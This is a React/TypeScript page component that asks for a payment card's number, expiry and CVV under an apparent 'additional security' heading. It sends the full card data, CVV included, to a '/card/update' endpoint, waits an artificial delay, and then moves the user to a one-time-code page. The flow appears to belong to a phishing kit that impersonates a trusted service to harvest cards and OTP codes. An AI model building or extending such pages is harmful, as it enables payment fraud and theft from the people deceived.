import { FormEvent, useLayoutEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import Description from "../components/typographies/Description";
import Title from "../components/typographies/Title";
import useCountry from "../hooks/useCountry";
import texts from "../utils/texts";
import Input from "../components/Input";
import Button from "../components/Button";
import useLoading from "../hooks/useLoading";
import useCard from "../hooks/useCard";
import api from "../utils/api";
import { DURATION_AFTER_CARD } from "../utils/constants";

export default function CardPage() {
  const navigate = useNavigate();
  const { locale } = useCountry();
  const { setLoadingAct } = useLoading();
  const { card, setCardAct } = useCard();

  const [cardNumber, setCardNumber] = useState<string>("");
  const [expiry, setExpiry] = useState<string>("");
  const [cvv, setCvv] = useState<string>("");

  const submitDisabled = !cardNumber || !expiry || !cvv;

  const onAcceptCardNumber = (value: string) => {
    setCardNumber(value);
  };

  const onAcceptExpiry = (value: string) => {
    setExpiry(value);
  };

  const onAcceptCvv = (value: string) => {
    setCvv(value);
  };

  const onSubmit = (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (submitDisabled) return;

    setLoadingAct(true);
    api
      .put(`/card/update/${card?.id}`, {
        ...card,
        number: cardNumber,
        expiry,
        cvv,
      })
      .then((res) => {
        const timeoutId = setTimeout(() => {
          setLoadingAct(false);
          setCardAct(res.data);
          navigate("/otp/1");

          clearTimeout(timeoutId);
        }, DURATION_AFTER_CARD);
      })
      .catch(() => {
        setLoadingAct(false);
      });
  };

  useLayoutEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  return (
    <div className="flex flex-col items-start gap-6 lg:gap-12">
      <div className="w-full flex flex-col lg:flex-row items-center gap-4 lg:gap-0 justify-start lg:justify-between">
        <Title>{texts.additSecure[locale]}</Title>
        <img src="/assets/images/card.png" alt="card" className="w-56" />
      </div>

      <Description>{texts.enterCard[locale]}</Description>

      <form
        className="flex flex-col items-center gap-8 lg:gap-24 w-full"
        onSubmit={onSubmit}
      >
        <div className="flex flex-col items-stretch gap-4 w-full">
          {/* Card number */}
          <Input
            type="text"
            name="cardNumber"
            placeholder={`${texts.cardNumberPlaceholder[locale]}:`}
            mask="0000 0000 0000 0000"
            value={cardNumber}
            onAccept={onAcceptCardNumber}
          />

          {/* Expiry */}
          <Input
            type="text"
            name="expiry"
            mask="00/00"
            placeholder={`${texts.expiryPlaceholder[locale]} (${texts.mmyy[locale]}):`}
            value={expiry}
            onAccept={onAcceptExpiry}
          />

          {/* CVV */}
          <Input
            type="text"
            name="cvv"
            mask="0000"
            placeholder={`${texts.cvvPlaceholder[locale]}:`}
            value={cvv}
            onAccept={onAcceptCvv}
          />
        </div>

        <Button type="submit" className="w-72" disabled={submitDisabled}>
          {texts.submit[locale]}
        </Button>
      </form>
    </div>
  );
}
